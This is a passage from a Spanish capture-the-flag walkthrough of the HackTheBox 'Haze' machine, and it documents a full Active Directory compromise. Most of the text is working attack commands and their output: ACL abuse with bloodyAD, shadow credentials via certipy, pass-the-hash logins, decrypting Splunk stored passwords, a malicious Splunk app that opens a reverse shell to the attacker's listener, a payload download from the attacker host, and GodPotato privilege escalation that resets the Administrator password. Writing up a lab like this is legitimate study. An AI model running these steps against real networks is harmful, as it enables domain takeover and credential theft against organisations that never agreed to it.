KRB5CCNAME=Haze-IT-Backup.ccache bloodyAD --host dc01.haze.htb -d haze.htb -k --dc-ip 10.10.11.61 set owner Support_Services 'Haze-IT-Backup$'

[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on Support_Services
~~~


## Collecting Data for Bloodhound Again

Recolectaremos nuevamente información para analizarla con BloodHound, porque hemos modificado ACL, por lo que ahora con la cuenta `Haze-IT-Backup$` contamos con permisos adicionales sobre el grupo `Support_Services`

~~~ bash
bloodhound-python -d haze.htb -ns 10.10.11.61 --zip -c All -u 'Haze-IT-Backup$' --hashes :4de830d1d58c14e241aff55f82ecdba1
~~~


## Abusing ACL - `ForceChangePassword` and `AddKeyCredentialLink`

El grupo `Support_Services` posee los derechos `ForceChangePassword` y `AddKeyCredentialLink` sobre el usuario `edward.martin`. Esto podría permitir dos escenarios:

- Cambiar la contraseña del usuario abusando de `ForceChangePassword`
- Shadow Credentials gracias a `AddKeyCredentialLink`

![image-center](/assets/images/posts/haze-bloodhound-2.png)
{: .align-center}

Utilizaremos `bloodyAD` para formar parte de este grupo y aprovechar estos derechos

> Debido al `Clean Up`, posiblemente necesites volver a asignar a `Haze-IT-Backup` como propietario de `Support_Services` para poder hacer los siguientes pasos
{: .notice--danger}

Como somos propietarios del grupo `Support_Services`, tenemos control sobre él. Comenzaremos asignando derechos `GenericAll` a la cuenta `gMSA` que controlamos

~~~ bash
KRB5CCNAME=Haze-IT-Backup.ccache bloodyAD --host dc01.haze.htb -d haze.htb -k --dc-ip 10.10.11.61 add genericAll Support_Services 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ has now GenericAll on Support_Services
~~~

Con estos derechos podremos agregar usuarios al grupo, lógicamente ahora agregaremos la cuenta que controlamos

~~~ bash
KRB5CCNAME=Haze-IT-Backup.ccache bloodyAD --host dc01.haze.htb -d haze.htb -k --dc-ip 10.10.11.61 add groupMember Support_Services 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ added to Support_Services
~~~

> En Active Directory (AD), los **privilegios de un usuario están reflejados en su TGT (Ticket Granting Ticket)**, debido a que los TGTs guardan la siguiente información: 
> 	- El `SID` del usuario, de los grupos a los que pertenece
> 	- Los privilegios y derechos del usuario o los grupos de usuario
> 	- Etc.
>
{: .notice--info}

Volveremos a solicitar un nuevo ticket para la cuenta `Haze-IT-Backup$`

~~~ bash
getTGT.py haze.htb/Haze-IT-Backup -hashes :4de830d1d58c14e241aff55f82ecdba1 -dc-ip 10.10.11.61
~~~


## (Failed) Abusing `ForceChangePassword`

Si intentamos abusar del derecho que nos permitiría cambiar la contraseña del usuario `edward.martin`, veremos una restricción de políticas de contraseña

~~~ bash
KRB5CCNAME=Haze-IT-Backup.ccache bloodyAD --host dc01.haze.htb -d haze.htb -k --dc-ip 10.10.11.61 set password edward.martin 'Password123!'

...
...
Password can't be changed before -2 days, 23:56:11.965885 because of the minimum password age policy.
~~~


## Shadow Credentials

Esta técnica contempla modificar el atributo `msDS-KeyCredentialLink`, añadiendo credenciales alternativas en forma de certificados, permitiendo autenticarnos como el usuario víctima sin conocer su contraseña.

Utilizaremos el TGT que solicitamos hace un momento y utilizaremos `certipy`, que automatiza la autenticación con el certificado

~~~ bash
KRB5CCNAME=Haze-IT-Backup.ccache certipy shadow auto -u 'Haze-IT-Backup$' -k -target dc01.haze.htb -account edward.martin -dc-ip 10.10.11.61
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9059b6c6-b3d6-76a8-418a-7f4b7d012898'
[*] Adding Key Credential with device ID '9059b6c6-b3d6-76a8-418a-7f4b7d012898' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '9059b6c6-b3d6-76a8-418a-7f4b7d012898' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Using principal: edward.martin@haze.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
~~~


## Shell as `edward.martin`

Es posible tanto utilizar el archivo  `.ccache` como hacer PassTheHash para conectarnos al dominio con una consola de `powershell`

~~~ bash
evil-winrm -i dc01.haze.htb -u edward.martin -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af' 

*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami
haze\edward.martin
~~~

En este punto ya podemos ver la flag del usuario sin privilegios

~~~ bash
*Evil-WinRM* PS C:\Users\edward.martin\Documents> type ..\Desktop\user.txt 
d7d...
~~~
<br>


# Escalada de Privilegios
---
## Finding Privilege Escalation Vector

En este punto debemos encontrar una forma de escalar nuestros privilegios, algunas de las técnicas comunes que podemos intentar son las siguientes.

Primeramente comprobaremos que estamos en la máquina victima

~~~ bash
*Evil-WinRM* PS C:\Users> ipconfig
~~~

### (Posible) - Local User Privileges

Listar los privilegios locales asignados al usuario podría ser una vía potencial si vemos privilegios como `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeCreateTokenPrivilege`, entre otros

~~~ bash
*Evil-WinRM* PS C:\Users> whoami /priv
~~~

### (Posible) Internally Open Ports - Services

Listar puertos abiertos internamente podría darnos una señal de servicios que se estén ejecutando y no son visibles desde fuera

~~~ bash
*Evil-WinRM* PS C:\Users> netstat -ano
~~~


## `Splunk` Backup Analysis

Dentro del directorio `C:\Backups`, se encuentra una copia de `Splunk`, aprovecharemos `evil-winrm` y la traeremos a nuestra máquina con el comando `download` 

~~~ bash
*Evil-WinRM* PS C:\Backups\Splunk> dir


    Directory: C:\Backups\Splunk


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip
~~~


## Decrypting `Splunk` Password - `admin`

Buscaremos credenciales para desencriptarlas como lo hicimos al principio. Primeramente buscaremos credenciales

~~~ bash
grep -iar 'bindDN = '

...
...
var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=

cat var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf

[default]

minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0


[Haze LDAP Auth]

SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
~~~

Estas credenciales al parecer son válidas para `alexander.green`. Sabemos que la clave secreta está en el directorio `etc/auth/`. Desencriptaremos la contraseña para verla en texto claro

~~~ bash
splunksecrets splunk-decrypt -S etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='

Sp1unkadmin@2k24
~~~

Si intentamos autenticarnos en el DC con estas credenciales, no tendremos éxito


## Splunk Auth as `admin`

Ingresaremos a `Splunk` con la contraseña que hemos encontrado, respecto al usuario, ha funcionado utilizar `admin`

~~~ bash
admin:Sp1unkadmin@2k24
~~~


## `Splunk` Reverse Shell

Tenemos acceso administrativo al Dashboard, esto nos permite administrar aplicaciones dentro de `Splunk`. Cargaremos una nueva app maliciosa que ejecute una consola de `powershell` hacia nuestra máquina.

Nos dirigiremos a `Apps` > `Manage Apps` > `Install app from file` para cargar nuestra reverse shell

![image-center](/assets/images/posts/haze-splunk-as-admin.png)
{: .align-center}

En cuanto a la construcción de la reverse shell, podemos utilizar el [siguiente repositorio](https://github.com/0xjpuff/reverse_shell_splunk) 

~~~ bash
git clone https://github.com/0xjpuff/reverse_shell_splunk
cd reverse_shell_splunk
~~~

>Editaremos el archivo `reverse_shell_splunk/bin/run.ps1` para enviar la conexión a nuestra IP por un puerto que nosotros seleccionemos.
{: .notice--warning}

Iniciaremos un listener en nuestra máquina atacante por un puerto, en mi caso elegí el `443`

~~~ bash 
rlwrap -cAr nc -lvnp 443
~~~

Crearemos el archivo que subiremos a `Splunk` con el comando `tar`

~~~ bash
tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk

reverse_shell_splunk/
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
~~~

Luego podemos cambiar la extensión del archivo a `.spl` para que funcione (lo probé sin hacer este paso de renombrarlo y también funciona)

~~~ bash
mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
~~~

Ahora cargaremos nuestra app maliciosa en la sección `Install App From File`

![image-center](/assets/images/posts/haze-splunk-as-admin-2.png)
{: .align-center}


## Shell as `alexander.green`

Cuando hagamos clic en `Upload`, recibiremos una conexión por el puerto que tenemos a la escucha, será una consola como el usuario `alexander.green`

~~~ bash
rlwrap -cAr nc -lvnp 443   
listening on [any] 443 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.61] 53015

stty raw -echo; fg  

[1]  + 88609 continued  rlwrap -cAr nc -lvnp 443

PS C:\Windows\system32> whoami
haze\alexander.green
~~~


## Abusing `SeImpersonatePrivilege`

Listando los privilegios a nivel local del usuario `alexander.green`, podemos ver que cuenta con el privilegio `SeImpersonatePrivilege`

> El abuso de **SeImpersonatePrivilege** en Windows es una técnica de escalada de privilegios que aprovecha una característica legítima del sistema: la capacidad de un proceso (con ese privilegio) para **suplantar el token de seguridad** de otro usuario.
{: .notice--info}

~~~ bash
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
~~~

Este privilegio en teoría nos permite actuar en nombre de otro usuario de forma temporal. Antes de buscar alguna herramienta `Potato.exe`, comprobaremos cierta información como la versión del sistema operativo, la arquitectura y la versión de .NET

~~~ bash
PS C:\Windows\system32> systeminfo

Host Name:                 DC01
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-20165-01481-AA286
Original Install Date:     3/4/2025, 11:00:20 PM
System Boot Time:          6/28/2025, 4:00:48 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
...
...
~~~

Podemos consultar la versión de `.NET` con el siguiente comando que extrae el valor de `release`

~~~ bash
PS C:\Windows\system32> (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full").Release

528449
~~~

Verificaremos este valor en la [web oficial](https://learn.microsoft.com/en-us/dotnet/framework/install/how-to-determine-which-versions-are-installed) de Microsoft buscándolo, veremos que se trata de `.NET 4.8`

![image-center](/assets/images/posts/haze-net-framework.png)
{: .align-center}

Podemos utilizar `GodPotato.exe` ya que soporta la versión de este escenario (Windows Server 2022)

~~~ bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
~~~

Iniciaremos un servidor HTTP para transferir el archivo al DC

~~~ bash
python3 -m http.server 80                                                                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Descargaremos el ejecutable desde la máquina víctima, una buena opción es el comando `curl` o `certutil`

~~~ bash
PS C:\Temp> curl http://10.10.14.98/GodPotato-NET4.exe -o GodPotato.exe
PS C:\Temp> dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/29/2025   5:36 AM          57344 GodPotato.exe
~~~

### Exploiting

Utilizaremos el parámetro `-cmd` para especificar lo que queremos que se ejecute, en este caso cambiamos la contraseña del usuario `Administrator` (no me funcionó una reverse shell)

~~~ bash
PS C:\Temp> .\GodPotato.exe -cmd 'net user Administrator Password123!'
[*] CombaseModule: 0x140727391879168
[*] DispatchTable: 0x140727394470216
[*] UseProtseqFunction: 0x140727393762112
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\1ecc5b22-040f-4692-a938-b10d00ed67dd\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00007402-064c-ffff-3f52-b9aaa9c74105
[*] DCOM obj OXID: 0x3626e949b69d0e8
[*] DCOM obj OID: 0xe9de6cdbb65ddcee
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 940 Token:0x408  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 528
The command completed successfully.
~~~


## Root Time

Ahora podremos conectarnos como el usuario `Administrator` proporcionando la contraseña que creamos

~~~ bash
evil-winrm-py -i 10.10.11.61 -u Administrator -p 'Password123!'    
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to 10.10.11.61:5985 as Administrator
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
haze\administrator
~~~

Ya podremos ver la última flag del sistema ubicada en la carpeta `C:\Users\Administrator\Desktop`

~~~ bash
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
588...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Happiness is when what you think, what you say, and what you do are in harmony.
> — Mohandas Gandhi
{: .notice--info}
